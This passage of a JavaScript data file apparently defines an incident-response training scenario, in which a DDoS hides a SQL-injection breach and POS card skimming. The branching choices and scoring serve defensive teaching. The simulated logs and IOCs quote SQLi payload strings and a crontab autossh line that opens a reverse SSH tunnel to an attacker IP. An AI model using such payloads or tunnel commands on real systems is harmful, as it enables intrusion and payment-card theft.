// DDoS Smokescreen — Data Theft Under Cover
// Scenario data for PumaResponse — format documented in README → Development.

// DDOS_DIVERSION: the scenario's world clock is minutes since the 19:08 handoff
// (negative = before it). POS-MGMT-01's malicious push rolls out in throttled
// waves — [from minute, stores infected, terminals infected] — until it is halted.
const DDOS_ROLLOUT = [[-Infinity, 33, 220], [-15, 39, 260], [-8, 43, 290], [0, 46, 310], [6, 49, 330], [12, 52, 347]];
function ddosRollout(t) {
  return DDOS_ROLLOUT.filter(([at]) => t >= at).pop();
}
// Store traffic: full Black Friday volume until 22:00, half until the 23:00 close, then no swipes
function ddosVolume(m) {
  return m < 172 ? 1 : m < 232 ? 0.5 : 0;
}
// Terminal-minutes of card swipes on infected terminals in [from, to), rollout frozen at haltT
function ddosSwipes(from, to, haltT, cap) {
  let n = 0;
  for (let m = Math.ceil(from); m < Math.min(to, 240); m++) {
    n += Math.min(cap || 347, ddosRollout(Math.min(m, haltT))[2]) * ddosVolume(m);
  }
  return n;
}
// ≈150 cards per infected terminal-hour at Black Friday peak; calibrated so the
// original good path (skimming 18:45–19:32) reproduces the 34,847-card figure.
const DDOS_CARD_RATE = 34847 / 13904;
// Cards exfiltrated: skimming began 18:45 (minute -23) and runs until exfil is cut
function ddosCards(f) {
  return Math.round((ddosSwipes(-23, f.exfilBlockT, f.haltT) + (f.extraSwipes || 0)) * DDOS_CARD_RATE);
}
function ddosCardsAt(t) {
  return ddosCards({ exfilBlockT: t, haltT: 999, extraSwipes: 0 });
}
// If the exfil can't be quantified, the brands count every card used at all 52 stores from the 18:30 push
function ddosWindowCards(f) {
  let n = 0;
  for (let m = -38; m < Math.min(f.exfilBlockT, 240); m++) n += 347 * ddosVolume(m);
  return Math.round((n + (f.extraSwipes || 0)) * DDOS_CARD_RATE);
}
function ddosStores(f) {
  return ddosRollout(Math.min(f.haltT, 999))[1];
}
function ddosTerminals(f) {
  return ddosRollout(Math.min(f.haltT, 999))[2];
}
// Revenue: e-commerce down 17:00 → ddosEndT at $42K/h; card acceptance $85K/h across 52 stores
function ddosEcomLoss(f) {
  return 42000 * (128 + f.ddosEndT) / 60;
}
function ddosStoreLoss(stores, minutes) {
  return stores * (85000 / 52) * Math.max(0, minutes) / 60;
}
function ddosPreciseScope(f) {
  return !!(f.forensicsDone || f.mgmtAnalyzed || f.saw_exfilVolume);
}
function ddosUsersKnown(f) {
  return !!(f.forensicsDone || f.saw_usersDump);
}
function ddosBackdoorKnown(f) {
  return !!(f.forensicsDone || f.mgmtAnalyzed || f.saw_persist || f.saw_authKeys);
}
function ddosScopeCards(f) {
  return ddosPreciseScope(f) ? ddosCards(f) : ddosWindowCards(f);
}
function ddosGaps(f) {
  return [f.memLost, f.stagingDown, f.mgmtLogsWiped, f.dbAuditLost, f.termLogsRolled,
    f.terminalsWiped && !f.forensicsDone && !f.memCaptured, f.pfiDisrupted].filter(Boolean).length;
}
function ddosPciStatus(f) {
  const gaps = ddosGaps(f);
  const late = f.brandNotice === 'tight' ? ' · brand notice at hour 18 of 24' : '';
  if (f.evidenceOverwritten || gaps >= 3) return 'PFI inconclusive — full PCI re-assessment ordered' + late;
  if (!ddosPreciseScope(f)) return 'PFI: exfil unquantified — worst-case window assessed' + late;
  if (gaps) return `PFI: ${gaps} evidence gap${gaps === 1 ? '' : 's'} — findings accepted with caveats` + late;
  return 'PFI evidence complete — remediation under QSA review' + late;
}
function ddosTime(t) {
  const m = (((1148 + Math.floor(t)) % 1440) + 1440) % 1440;
  return String(Math.floor(m / 60)).padStart(2, '0') + ':' + String(m % 60).padStart(2, '0');
}
function ddosN(n) {
  return Math.round(n).toLocaleString('en-US');
}
// Exfil sinkholed and POS-MGMT-01 isolated 14 minutes after the call at minute T (never later than already done)
function ddosSeal(f, T) {
  return { exfilBlockT: Math.min(f.exfilBlockT, T + 14), haltT: Math.min(f.haltT, T + 14), mgmtIsolated: true };
}

registerIncident(
  {
    id: 'DDOS_DIVERSION',
    title: 'DDoS Smokescreen — Data Theft Under Cover',
    client: 'CrestView Retail Group',
    severity: 'CRITICAL',
    sevClass: 'high',
    ticketId: 'IR-2024-0634',
    // In-world "today" (Black Friday 2024 — the scenario is set on Black Friday): dates in this file are written relative to it and
    // shown shifted to the real date (see REAL-DATE ANCHORING in js/game.js)
    baseDate: '2024-11-29',
    assignedTime: '19:08 UTC',
    summary: 'Volumetric DDoS attack on e-commerce platform (Black Friday weekend). While the SOC scrambles to mitigate, attackers exploit a SQLi vulnerability on a forgotten staging server and pivot to the POS network. Card skimming malware deployed.',
    iocs: [
      { type: 'IP RANGE', val: '192.0.2.0/24 — DDoS source (botnet, spoofed)' },
      { type: 'IP', val: '198.18.33.71 — SQLi attacker (VPN, Eastern Europe)' },
      { type: 'URL', val: '/api/v1/products?id=1\' OR 1=1-- — SQLi on staging' },
      { type: 'FILE', val: 'pos-update.dll — card skimming malware (memory scraper)' },
      { type: 'DOMAIN', val: 'cdn-static-assets[.]xyz — exfil domain (card data)' },
    ],
    // Run state. Times are minutes since the 19:08 handoff (see ddosTime); 999 = never.
    initialFlags: {
      t: 0,                      // scenario clock at the start of the current phase
      exfilBlockT: 999,          // when card exfil from the main fleet stopped
      haltT: 999,                // when POS-MGMT-01's push was frozen (rollout stops growing)
      extraSwipes: 0,            // terminal-minutes skimmed outside the main window (holdouts, re-push)
      ddosEndT: 112,             // when the storefront came back (21:00 unless all hands went to DDoS)
      posLoss: 0,                // dollars of in-store sales lost to POS downtime
      mgmtIsolated: false,       // POS-MGMT-01 cut off from the attacker's tunnel
      stagingDown: false,        // staging powered off in triage — RAM and tmpfs /tmp lost
      memCaptured: false,        // terminal RAM + winupd.dat preserved before the kill
      memLost: false,            // store staff powered terminals off — volatile evidence gone
      mgmtLogsWiped: false,      // attacker cleared POS-MGMT-01 history/deploy log via the tunnel
      dbAuditLost: false,        // replica query audit for the dump window rotated away
      termLogsRolled: false,     // terminal event logs wrapped at high-volume stores
      forensicsDone: false,      // full forensic imaging + chain reconstruction
      mgmtAnalyzed: false,       // POS-MGMT-01 analysed and exfil counted
      evidenceOverwritten: false,// investigation went to the DDoS; ops overwrote the breach evidence
      terminalsWiped: false,     // terminals reimaged
      mgmtBackdoor: true,        // attacker's authorized_keys entry + cron'd autossh on POS-MGMT-01
      mgmtRebuilt: false,        // POS-MGMT-01 rebuilt from clean media
      segmented: false,          // POS network segmented
      usersReset: false,         // forced reset of the 412K online accounts
      pfiDisrupted: false,       // mid-investigation emergency restart
      brandNotice: '',           // '' | 'ontime' | 'tight'
    },
    // 2 real seconds per game minute once the decision clock starts; 10-minute par
    clock: { rate: 0.5, par: 10 },
    // Best achievable total (every finding tagged, instant decisions, best path).
    // Grades are a percentage of this. Recompute with tools/scenario-harness.js after
    // changing this scenario's scores, carried penalties or findings.
    bestScore: 338,
    // MITRE ATT&CK (Enterprise v19) technique per finding, shown in the debrief.
    // Findings that aren't adversary behavior (missing controls, business facts) are omitted.
    attack: {
      sqli: "T1190 Exploit Public-Facing Application",
      lateral: "T1021.004 Remote Services: SSH",
      posPush: "T1072 Software Deployment Tools",
      beacon: "T1071.001 Application Layer Protocol: Web Protocols",
      dllHook: "T1055.001 Process Injection: Dynamic-link Library Injection",
      buffer: "T1074.001 Data Staged: Local Data Staging",
      exfil: "T1041 Exfiltration Over C2 Channel",
      persist: "T1572 Protocol Tunneling",
      usersDump: "T1213.006 Data from Information Repositories: Databases",
      plaintextKeys: "T1552.004 Unsecured Credentials: Private Keys",
      authKeys: "T1098.004 Account Manipulation: SSH Authorized Keys",
    },
    debrief: f => [
      ['Cards Stolen', ddosN(ddosCards(f))],
      ['Stores Affected', `${ddosStores(f)} of 52 (${ddosTerminals(f)} terminals)`],
      ['Revenue Lost to Downtime', fmtUSD(ddosEcomLoss(f) + f.posLoss)],
      ['PCI Status', ddosPciStatus(f)],
      ['Attacker Access at Close', f.mgmtBackdoor ? 'STILL PRESENT (POS-MGMT-01)' : 'Removed'],
    ],
    phases: [
      { // TRIAGE
        name: 'TRIAGE',
        narrative: 'It\'s Black Friday weekend and CrestView\'s e-commerce platform is down. A massive DDoS attack — 85 Gbps — is hammering their CDN and origin servers. The SOC team is entirely focused on DDoS mitigation. Meanwhile, a junior analyst notices a separate alert buried in the noise: a SQL injection attempt on staging-api.crestview.com succeeded 2 hours ago. Nobody has looked at it.',
        evidence: {
          title: 'PARALLEL ATTACK INDICATORS',
          content: `<span class="log-warn">[17:00]</span> <span class="log-highlight">DDoS ATTACK</span> — 85 Gbps volumetric flood
  Target: www.crestview.com, api.crestview.com
  Type: DNS amplification + SYN flood
  Status: CDN absorbing ~60%, origin servers degraded
  Revenue impact: ~$42,000/hour in lost sales
<span class="log-warn">[17:03]</span> Edge firewall: 2.3M pps SYN from 192.0.2.0/24 (spoofed)
<span class="log-warn">[17:04]</span> Origin LB: health checks failing — 6/8 web nodes DOWN
<span class="log-warn">[17:06]</span> WAF: rate-limit rule RL-403 triggered 184,220 times
<span class="log-warn">[17:08]</span> WAF Alert (priority LOW — queued behind rate-limit events):
  <span class="log-highlight">SQLi SUCCESS</span> on staging-api.crestview.com<!--f:sqli-->
  Source: 198.18.33.71 (VPN exit, Romania)<!--f:sqli-->
  Payload: /api/v1/products?id=1' UNION SELECT * FROM users--<!--f:sqli-->
  staging-api has DB credentials for production catalog DB<!--f:sharedCreds-->
<span class="log-warn">[17:12]</span> DNS: 41 Gbps of amplified ANY responses from open resolvers
<span class="log-warn">[17:20]</span> Support desk: 1,240 tickets "site down / checkout failing"
<span class="log-warn">[17:31]</span> CDN provider: scrubbing profile "BF-aggressive" enabled
<span class="log-warn">[17:45]</span> staging-api → prod-db-replica: Unusual queries<!--f:sharedCreds-->
<span class="log-warn">[18:05]</span> DDoS vector shift: HTTP/2 rapid reset against /checkout
<span class="log-warn">[18:15]</span> <span class="log-highlight">ALERT</span> Lateral movement: staging-api → POS-MGMT-01<!--f:lateral-->
  Method: SSH with harvested credentials from catalog DB<!--f:lateral-->
<span class="log-warn">[18:22]</span> CDN: 58% absorbed, origin p95 latency 14.2 s
<span class="log-warn">[18:30]</span> POS-MGMT-01 → 347 POS terminals: Software push initiated<!--f:posPush-->
<span class="log-warn">[18:40]</span> SOC: all 6 analysts assigned to DDoS bridge call
<span class="log-warn">[18:55]</span> Status page: "Degraded performance" posted
<span class="log-warn">[19:08]</span> Anomaly: POS terminals beaconing to cdn-static-assets[.]xyz<!--f:beacon-->`
        },
        choices: [
          {
            key: 'A',
            label: 'Split the team: DDoS mitigation continues, you investigate the SQLi and POS alerts',
            desc: 'Recognize this as a two-pronged attack. Keep DDoS response going but immediately pivot to the SQLi/POS compromise as the real threat.',
            quality: 'good',
            score: { time: 15, containment: 15, evidence: 15, thoroughness: 10 },
            // Pivoting the team and getting eyes on POS-MGMT-01 takes ten minutes
            sets: (f, st) => ({ t: st.phaseClock + 10 }),
            outcome: (f, st) => `You correctly identify the DDoS as a smokescreen. While the network team continues DDoS mitigation with the CDN provider, you focus on the real attack: SQL injection leading to POS compromise. The 2-hour head start the attacker had is concerning — about ${ddosN(ddosCardsAt(st.phaseClock))} cards have already left through cdn-static-assets[.]xyz from ${ddosRollout(st.phaseClock)[1]} of 52 stores — but you're now tracking the actual threat.`,
          },
          {
            key: 'B',
            label: 'Focus all resources on the DDoS — it\'s Black Friday and the site is down',
            desc: 'The DDoS is the business-critical issue. Revenue is bleeding at $42K/hour. Fix that first.',
            quality: 'bad',
            score: { time: -20, containment: -20, evidence: -10, thoroughness: -10 },
            // The extra hands get the storefront back at 20:00; nobody reads the alerts until 21:00
            sets: (f, st) => ({ t: st.phaseClock + 112, ddosEndT: 52 }),
            outcome: (f, st) => `All hands on DDoS. The SQLi and POS alerts sit unacknowledged. The malicious push finishes rolling out to all 347 POS terminals, and every card swipe at every CrestView location is now being captured and exfiltrated. The extra hands do get the storefront back about an hour early — roughly $42,000 of online sales saved. By the time the DDoS subsides and someone finally looks at the buried alerts, ${ddosN(ddosCardsAt(st.phaseClock + 112))} card numbers have been stolen.`,
          },
          {
            key: 'C',
            label: 'Shut down the staging server and escalate the SQLi, but keep DDoS as primary',
            desc: 'Quick containment on staging. But the DDoS is still the main event — it\'s costing real money.',
            quality: 'partial',
            score: { time: 5, containment: 5, evidence: 5, thoroughness: 0 },
            sets: (f, st) => ({ stagingDown: true, t: st.phaseClock + 60 }),
            outcome: 'Staging server shut down — good, but the attacker already pivoted to POS-MGMT-01 an hour ago. The staging server was just the entry point, and pulling the plug on it also throws away everything that lived only in its memory. By treating DDoS as primary, you delay investigation of the POS compromise by another hour. Card data continues to be skimmed from all 347 terminals.',
          },
          {
            key: 'D',
            when: f => f.saw_beacon && f.saw_lateral,
            label: 'Call it a diversion: sinkhole cdn-static-assets[.]xyz and freeze POS-MGMT-01\'s push now; leave the flood to the CDN',
            desc: 'The beacon and the SSH pivot are the real incident. Cut the exfil channel and stop the rollout before anything else, then hand the DDoS to the CDN provider\'s scrubbing team.',
            quality: 'good',
            score: { time: 20, containment: 25, evidence: 15, thoroughness: 10 },
            sets: (f, st) => ({ exfilBlockT: st.phaseClock + 4, haltT: st.phaseClock + 4, mgmtIsolated: true, t: st.phaseClock + 10 }),
            outcome: (f, st) => {
              const g = { exfilBlockT: st.phaseClock + 4, haltT: st.phaseClock + 4, extraSwipes: 0 };
              return `Four minutes after your call, the store resolvers answer cdn-static-assets[.]xyz with the sinkhole and the egress firewalls drop its IPs. Exfil stops at about ${ddosN(ddosCards(g))} cards. You suspend POS-MGMT-01's distribution job and pull its internet egress, severing the attacker's SSH tunnel — the push is frozen at ${ddosStores(g)} of 52 stores (${ddosTerminals(g)} terminals). The scraper is still running in memory on those terminals, but nothing it captures can leave. The CDN provider takes the flood.`;
            },
          },
        ],
        live: (f, st) => `CARDS STOLEN: ${ddosN(ddosCardsAt(st.phaseClock))} · STORES INFECTED: ${ddosRollout(st.phaseClock)[1]}/52`,
        timeline: [
          { at: 6, sev: 'crit', text: 'POS-MGMT-01: push wave delivered — 49/52 stores now running pos-update.dll', score: { containment: -3 } },
          { at: 9, sev: 'warn', text: () => `cdn-static-assets[.]xyz: 5-minute exfil batch from 330 terminals — ~${ddosN(ddosCardsAt(9))} cards out so far` },
          { at: 12, sev: 'crit', text: 'POS-MGMT-01: distribution complete — all 347 terminals at 52 stores infected', score: { containment: -3 } },
          { at: 20, sev: 'warn', text: 'SOC bridge: "Whoever is on the WAF queue, drop it and join the DDoS call."', score: { thoroughness: -3 } },
        ],
        siemEntries: [
          { time: '19:08', sev: 'crit', text: 'INCIDENT ASSIGNED — DDoS + Intrusion — CrestView Retail' },
          { time: '19:08', sev: 'crit', text: 'Active DDoS: 85 Gbps — revenue loss $42K/hour' },
          { time: '19:09', sev: 'crit', text: 'SQLi compromise on staging — lateral movement to POS network' },
          { time: '19:10', sev: 'warn', text: 'POS terminals beaconing to unknown domain — card skimmer?' },
        ],
      },
      { // CONTAINMENT
        name: 'CONTAINMENT',
        carried: f => {
          const out = [];
          if (f.t >= 100) out.push({
            text: `While every analyst was on the DDoS bridge, the scraper ran unchallenged at all 52 stores. By ${ddosTime(f.t)}, about ${ddosN(ddosCardsAt(f.t))} cards are gone.`,
            score: { containment: -5 },
          });
          if (f.stagingDown) out.push({
            text: 'Powering off staging-api discarded its RAM and its /tmp, which on that build is a tmpfs. Whatever the attacker ran or dropped there is gone, and the PFI will ask for it.',
            score: { evidence: -5 },
          });
          if (f.exfilBlockT < 999) out.push({
            sev: 'good',
            text: `Exfil sinkholed at ${ddosTime(f.exfilBlockT)}; POS-MGMT-01's push frozen at ${ddosStores(f)} of 52 stores. Every store it never reached is one the PFI and the card brands never have to count.`,
          });
          return out;
        },
        narrative: f => {
          if (f.exfilBlockT < 999) return 'You called the diversion early: cdn-static-assets[.]xyz is sinkholed and POS-MGMT-01\'s push is frozen. But the scraper is still loaded on every infected terminal, buffering card data it can no longer send, and the management server still holds whatever the attacker left on it.';
          const lead = f.t >= 100
            ? `It is ${ddosTime(f.t)}. The DDoS is over, the bridge call has broken up, and someone finally opens the buried alerts.`
            : f.stagingDown
              ? 'An hour after staging-api went dark, the POS alerts finally reach the top of the queue. The DDoS is being handled by the CDN provider.'
              : 'You\'ve identified the dual-pronged attack. The DDoS is being handled by the CDN provider.';
          const push = ddosRollout(f.t)[2] >= 347
            ? 'the attacker has compromised the POS management server and pushed malicious software to 347 POS terminals across 52 retail locations.'
            : `the attacker has compromised the POS management server and is pushing malicious software to all 347 POS terminals across 52 retail locations — ${ddosRollout(f.t)[2]} terminals at ${ddosRollout(f.t)[1]} stores already have it.`;
          return `${lead} Your focus is the real threat: ${push} Card data is actively being exfiltrated.`;
        },
        evidence: {
          title: 'POS COMPROMISE ANALYSIS',
          content: f => {
            const r = f.haltT < 999 ? ddosRollout(f.haltT) : ddosRollout(f.t);
            const status = f.haltT < 999
              ? `<span class="log-highlight">HALTED</span> at ${r[2]}/347 terminals (${r[1]}/52 stores)`
              : r[2] >= 347 ? 'complete — 347/347 terminals (52/52 stores)' : `${r[2]}/347 terminals (${r[1]}/52 stores), in progress`;
            const cards = f.exfilBlockT < 999 ? ddosCards(f) : ddosCardsAt(f.t);
            return `<span class="log-warn">[18:30]</span> POS-MGMT-01: Software distribution initiated
  Package: "POS-security-patch-v2.4.1.msi"
  Actually contains: pos-update.dll (memory scraper)<!--f:dllHook-->
  Targets: All 347 POS terminals across 52 locations
  Distribution status: ${status}
<span class="log-warn">[18:31]</span> POS-MGMT-01: throttle 4 stores/wave (WAN bandwidth policy)
<span class="log-warn">[18:32]</span> pos-update.dll injection: hooks payment processing DLL<!--f:dllHook-->
  Scrapes Track 1 &amp; Track 2 data from process memory<!--f:dllHook-->
  Buffers data locally in C:\\Windows\\Temp\\winupd.dat<!--f:buffer-->
<span class="log-warn">[18:40]</span> Terminal heartbeat: 347/347 online, payment app v7.2.3
<span class="log-warn">[18:45]</span> <span class="log-highlight">Exfil begins</span>: HTTPS POST to cdn-static-assets[.]xyz<!--f:exfil-->
  Interval: every 5 minutes, base64-encoded card data<!--f:exfil-->
  <span class="log-highlight">Estimated: ~150 cards per terminal per hour (Black Friday peak)</span>
<span class="log-warn">[18:50]</span> Store 031: receipt printer offline (paper out)
<span class="log-warn">[18:58]</span> Payment gateway: auth success 99.2% — no processor-side anomalies
<span class="log-warn">[19:00]</span> POS-MGMT-01: SSH tunnel to 198.18.33.71 (persistent)<!--f:persist-->
  crontab: */10 * * * * autossh -M 0 -N -R 2222:localhost:22 198.18.33.71<!--f:persist-->
<span class="log-warn">[19:05]</span> Loyalty kiosk sync: 52/52 stores OK
<span class="log-warn">[${ddosTime(f.t)}]</span> Cards exfiltrated so far: ~${ddosN(cards)}${f.exfilBlockT < 999 ? ` (exfil blocked ${ddosTime(f.exfilBlockT)})` : ''}`;
          }
        },
        choices: [
          {
            key: 'A',
            label: f => f.exfilBlockT < 999
              ? 'Keep the sinkhole and isolation in place, push the emergency kill command to every infected terminal'
              : 'Block exfil domain at DNS/firewall, isolate POS-MGMT-01, push emergency kill command to terminals',
            desc: f => f.exfilBlockT < 999
              ? 'Exfil is already cut. Use the POS management channel to terminate the malicious DLL on every terminal that received it.'
              : 'Sever the exfil channel, isolate the management server, and use the POS management infrastructure to push a kill command that terminates the malicious DLL on all terminals.',
            quality: 'good',
            score: { time: 15, containment: 25, evidence: 10, thoroughness: 10 },
            sets: (f, st) => ({ ...ddosSeal(f, f.t + st.phaseClock), t: f.t + st.phaseClock + 24 }),
            outcome: (f, st) => {
              const g = { ...f, ...ddosSeal(f, f.t + st.phaseClock) };
              if (f.exfilBlockT < 999) return `Kill command pushed over the POS management VLAN — pos-update.dll terminated on all ${ddosTerminals(g)} infected terminals within 12 minutes. Exfil was already dead, so the exposure holds at about ${ddosN(ddosCards(g))} cards from ${ddosStores(g)} stores.`;
              return `DNS sinkhole on cdn-static-assets[.]xyz and an egress block on its IPs go live across the store resolvers at ${ddosTime(g.exfilBlockT)}, stopping exfiltration from all 347 terminals. POS-MGMT-01 isolated from everything but the store management VLAN — attacker's SSH tunnel severed. Emergency process kill pushed via POS management to terminate pos-update.dll. Card skimming stopped across all locations within 12 minutes. Estimated exposure: ~${ddosN(ddosCards(g))} cards.`;
            },
          },
          {
            key: 'B',
            label: 'Instruct all 52 store managers to manually shut down POS terminals',
            desc: 'Call each location and have them power off terminals until the issue is resolved.',
            quality: 'partial',
            score: { time: -10, containment: 10, evidence: -10, thoroughness: 0 },
            // 38 stores go dark over two hours (call it an hour on average); 14 never answer
            sets: (f, st) => {
              const T = f.t + st.phaseClock;
              return {
                exfilBlockT: Math.min(f.exfilBlockT, T + 60),
                extraSwipes: f.extraSwipes + (f.exfilBlockT < 999 ? 0 : ddosSwipes(T + 60, 240, 999, 93)),
                memLost: true,
                mgmtLogsWiped: f.mgmtLogsWiped || !f.mgmtIsolated,
                posLoss: f.posLoss + ddosStoreLoss(38, 232 - (T + 60)),
                t: T + 120,
              };
            },
            outcome: (f, st) => {
              const T = f.t + st.phaseClock;
              const open = f.exfilBlockT >= 999;
              const g = { ...f, exfilBlockT: Math.min(f.exfilBlockT, T + 60), extraSwipes: f.extraSwipes + (open ? ddosSwipes(T + 60, 240, 999, 93) : 0) };
              return 'You start calling stores but it\'s Black Friday — managers are overwhelmed, phones go to voicemail, and some stores have already closed for the night with terminals still running. After 2 hours, 38 of 52 locations have complied. '
                + (open ? 'The remaining 14 locations continue skimming cards until they close at 23:00. ' : 'Exfil is already sinkholed, so the 14 holdouts leak nothing — but the scraper stays loaded on their terminals. ')
                + `Volatile memory evidence is lost on powered-off terminals. Revenue loss from offline POS adds to the DDoS impact: about ${fmtUSD(ddosStoreLoss(38, 232 - (T + 60)))} at the dark stores tonight.`
                + (f.mgmtIsolated ? '' : ' And nobody touches POS-MGMT-01 — the attacker\'s tunnel stays up the whole time.')
                + ` Estimated exposure: ~${ddosN(ddosCards(g))} cards.`;
            },
          },
          {
            key: 'C',
            label: 'Focus on the staging server and close the SQLi vulnerability',
            desc: 'Patch the entry point. The staging server is how they got in.',
            quality: 'bad',
            score: { time: -5, containment: -15, evidence: 5, thoroughness: -10 },
            // Two more hours pass before anyone circles back and cuts the exfil channel
            sets: (f, st) => {
              const T = f.t + st.phaseClock;
              return { ...ddosSeal(f, T + 120), mgmtLogsWiped: f.mgmtLogsWiped || !f.mgmtIsolated, t: T + 150 };
            },
            outcome: (f, st) => {
              const g = { ...f, ...ddosSeal(f, f.t + st.phaseClock + 120) };
              return (f.stagingDown ? 'Staging is already dark, so you spend the time building and testing the patch' : 'Staging server patched')
                + ' — but the attacker is already deep inside the POS network. Closing the front door doesn\'t help when the burglar is already in the house. '
                + (f.exfilBlockT < 999
                  ? `Exfil was already sinkholed, so no more cards leave — but for two more hours the scraper sits resident on ${ddosTerminals(g)} terminals and nobody looks at what the attacker left on POS-MGMT-01.`
                  : `Card skimming continues uninterrupted across all 347 terminals. Another two hours pass before someone circles back to the POS compromise and cuts the exfil channel. Estimated exposure grows to ~${ddosN(ddosCards(g))} cards.`);
            },
          },
          {
            key: 'D',
            when: f => f.saw_buffer,
            label: 'Preserve, then kill: block exfil, isolate POS-MGMT-01, capture RAM and winupd.dat from sample terminals, then push the kill',
            desc: 'The scraper keeps its haul in a local buffer. Image memory and C:\\Windows\\Temp\\winupd.dat on a sample of terminals before the kill command destroys the process — the PFI will want both.',
            quality: 'good',
            score: { time: 10, containment: 25, evidence: 20, thoroughness: 15 },
            sets: (f, st) => ({ ...ddosSeal(f, f.t + st.phaseClock), memCaptured: true, t: f.t + st.phaseClock + 30 }),
            outcome: (f, st) => {
              const g = { ...f, ...ddosSeal(f, f.t + st.phaseClock) };
              return (f.exfilBlockT < 999 ? 'Exfil is already sinkholed. ' : `Sinkhole and egress block go live at ${ddosTime(g.exfilBlockT)}; POS-MGMT-01 is isolated to the store management VLAN and the attacker's tunnel drops. `)
                + 'Before the kill goes out, you pull memory images and the winupd.dat buffer from 10 sample terminals across 6 stores through the management agent. The buffers decode to Track 1/2 records queued since the last successful POST — proof of exactly what the scraper held, and the in-process hook the PFI would otherwise have to infer. '
                + `Then the kill: pos-update.dll terminated on all ${ddosTerminals(g)} infected terminals. Estimated exposure: ~${ddosN(ddosCards(g))} cards.`;
            },
          },
        ],
        live: (f, st) => f.exfilBlockT < 999
          ? `EXFIL: BLOCKED · CARDS STOLEN: ${ddosN(ddosCards(f))} · SCRAPER RESIDENT ON ${ddosTerminals(f)} TERMINALS`
          : `CARDS STOLEN: ${ddosN(ddosCardsAt(f.t + st.phaseClock))} · EXFIL: OPEN · STORES INFECTED: ${ddosRollout(f.t + st.phaseClock)[1]}/52`,
        timeline: [
          { at: 5, when: f => f.exfilBlockT >= 999, sev: 'crit', text: f => `cdn-static-assets[.]xyz: exfil batch — ~${ddosN(ddosCardsAt(f.t + 5))} cards out so far`, score: { containment: -3 } },
          { at: 6, when: f => f.exfilBlockT < 999, sev: 'warn', text: 'Terminals: sinkholed POSTs failing — winupd.dat buffers growing on every infected lane' },
          { at: 10, when: f => !f.mgmtIsolated, sev: 'crit', text: 'POS-MGMT-01 (tunnel from 198.18.33.71): bash history cleared, deployment log truncated',
            sets: { mgmtLogsWiped: true }, score: { evidence: -3 } },
          { at: 16, when: f => f.exfilBlockT >= 999, sev: 'crit', text: f => `Exfil continues — ~${ddosN(ddosCardsAt(f.t + 16))} cards stolen`, score: { containment: -3 } },
        ],
        siemEntries: f => [
          { time: ddosTime(f.t + 12), sev: 'crit', text: `${ddosTerminals(f.haltT < 999 ? f : { haltT: f.t })} POS terminals compromised — ${f.exfilBlockT < 999 ? 'scraper resident, exfil blocked' : 'active card skimming'}` },
          { time: ddosTime(f.t + 14), sev: 'warn', text: 'Exfil to cdn-static-assets[.]xyz every 5 minutes per terminal' },
          { time: ddosTime(f.t + 17), sev: 'crit', text: `Estimated ${ddosN(f.exfilBlockT < 999 ? ddosCards(f) : ddosCardsAt(f.t))} cards exfiltrated so far` },
        ],
      },
      { // INVESTIGATION
        name: 'INVESTIGATION',
        carried: f => {
          const out = [];
          if (f.extraSwipes > 0) out.push({
            text: `The 14 stores that never answered kept skimming — and exfiltrating — until they closed at 23:00: about ${ddosN(f.extraSwipes * DDOS_CARD_RATE)} more cards. You sinkhole cdn-static-assets[.]xyz first thing this phase.`,
            score: { containment: -5 },
          });
          if (f.mgmtLogsWiped) out.push({
            text: 'POS-MGMT-01 stayed reachable through the attacker\'s tunnel. Before it was cut, they cleared bash history and truncated the deployment log — the push can now only be reconstructed from the terminal side.',
            score: { evidence: -5 },
          });
          if (f.memLost) out.push({
            sev: 'info',
            text: 'Terminals the stores powered off lost the in-memory scraper and its hooks. For 38 stores the PFI will have disk artefacts only.',
          });
          return out;
        },
        narrative: f => (f.extraSwipes > 0 ? 'Card skimming is finally stopped at every store.' : 'Card skimming is stopped.')
          + (f.ddosEndT <= f.t ? ' The DDoS is over.' : ' The DDoS is subsiding.')
          + ' Now you need the full picture: how the staging server was exposed, the complete attack chain from SQLi to POS, what data was exfiltrated, and whether there are other persistence mechanisms. The payment card brands will want a detailed forensic report.',
        evidence: {
          title: 'ATTACK CHAIN RECONSTRUCTION',
          content: f => `<span class="log-ok">── ATTACK TIMELINE ──</span>
<span class="log-warn">[17:00]</span> DDoS launched — SOC distracted
<span class="log-warn">[17:05]</span> SQLi reconnaissance on staging-api.crestview.com
  Server: Forgotten staging instance, last patched 14 months ago<!--f:unpatched-->
  Framework: Express.js with raw SQL queries (no parameterization)<!--f:unpatched-->
<span class="log-warn">[17:08]</span> SQLi exploitation: UNION-based extraction
  Extracted: catalog DB credentials (shared with production)
<span class="log-warn">[17:15]</span> Database pivot: staging → prod-db-replica
  Dumped: users table — 412,000 rows, unsalted SHA-1 password hashes<!--f:usersDump-->
  Dumped: admin_credentials table
  <span class="log-highlight">admin_credentials: plaintext SSH keys for POS-MGMT-01</span><!--f:plaintextKeys-->
<span class="log-warn">[17:30]</span> prod-db-replica: replication lag 4.1 s (Black Friday write load)
<span class="log-warn">[18:00]</span> POS-MGMT-01: scheduled price-file sync to 52 stores
<span class="log-warn">[18:15]</span> SSH to POS-MGMT-01 using extracted keys
<span class="log-warn">[18:16]</span> POS-MGMT-01: key "deploy@build" appended to /root/.ssh/authorized_keys<!--f:authKeys-->
<span class="log-warn">[18:30]</span> Malware deployment to ${ddosTerminals(f)} terminals via management push
<span class="log-warn">[18:45]</span> Card skimming + exfiltration begins
<span class="log-warn">[18:50]</span> CDN: DDoS peak 91 Gbps

<span class="log-ok">── EXFIL ANALYSIS ──</span>
  Data sent to cdn-static-assets[.]xyz: ${(ddosCards(f) * 120 / 1e6).toFixed(1)} MB<!--f:exfilVolume-->
  Estimated unique card numbers: ~${ddosN(ddosCards(f))}<!--f:exfilVolume-->
  Exfil host: VPS, registered 9 days ago, privacy-proxied WHOIS
  Card types: Visa, Mastercard, Amex, Discover
  Data captured: Track 1 + Track 2 (full magnetic stripe)`
        },
        choices: [
          {
            key: 'A',
            label: 'Full forensic analysis: image POS terminals, analyze malware, map network paths, quantify card exposure',
            desc: 'Comprehensive investigation: forensic images of POS-MGMT-01 and sample terminals, malware reverse engineering, complete network path analysis, and precise card exposure quantification.',
            quality: 'good',
            score: { time: -5, containment: 5, evidence: 25, thoroughness: 20 },
            sets: { forensicsDone: true },
            outcome: f => 'Forensic analysis reveals the complete attack chain. Malware analysis shows pos-update.dll is a custom variant of a known POS scraper (FIN7 attribution possible). '
              + `Network analysis confirms no additional persistence beyond POS-MGMT-01, where it finds the attacker's authorized_keys entry and the cron'd autossh job${f.saw_persist ? ' you flagged during containment' : ''}. `
              + `Card exposure quantified precisely: ${ddosN(ddosCards(f))} unique cards from ${ddosStores(f)} stores. `
